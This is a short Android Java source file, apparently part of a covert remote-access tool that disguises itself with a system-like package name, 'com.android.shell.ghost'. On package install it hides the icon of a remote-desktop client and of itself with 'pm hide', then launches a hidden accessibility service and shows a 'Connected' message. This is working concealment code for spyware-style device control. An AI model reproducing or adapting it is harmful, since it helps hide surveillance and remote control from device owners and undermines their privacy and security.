package com.android.shell.ghost;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

/**
 * Listens for PACKAGE_ADDED and hides the installed app icon.
 */
public class PackageInstallReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String pkg = intent.getDataString();
        if (pkg == null) return;
        if (pkg.equals("com.betterdesk.client.universal") || pkg.equals("com.android.shell.ghost")) {
            // Hide the icon
            try {
                Runtime.getRuntime().exec("pm hide " + pkg).waitFor();
            } catch (Exception ignored) {}
            // Start the hidden service
            GhostAccessibilityService.startHiddenService(context);
            Toast.makeText(context, "Connected", Toast.LENGTH_SHORT).show();
        }
    }
}